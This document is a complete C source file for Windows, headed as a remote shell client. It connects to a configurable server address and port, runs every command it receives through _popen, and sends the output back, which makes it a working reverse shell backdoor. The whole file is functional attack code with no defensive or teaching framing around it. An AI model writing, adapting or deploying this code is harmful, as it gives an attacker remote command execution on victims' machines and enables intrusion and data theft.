// Remote Shell Client Module
// Receives commands from server, executes, and sends back output
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1" // Change as needed
#define SERVER_PORT 4445
#define BUFFER_SIZE 4096

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int recv_size;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        WSACleanup();
        return 1;
    }

    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        recv_size = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (recv_size <= 0) break;
        buffer[recv_size] = '\0';
        if (strcmp(buffer, "exit") == 0) break;

        FILE *fp = _popen(buffer, "r");
        if (!fp) {
            char *err = "Failed to execute command\n";
            send(sock, err, strlen(err), 0);
            continue;
        }
        char outbuf[BUFFER_SIZE];
        while (fgets(outbuf, BUFFER_SIZE, fp)) {
            send(sock, outbuf, strlen(outbuf), 0);
        }
        _pclose(fp);
        char *endmsg = "<END_OF_OUTPUT>\n";
        send(sock, endmsg, strlen(endmsg), 0);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
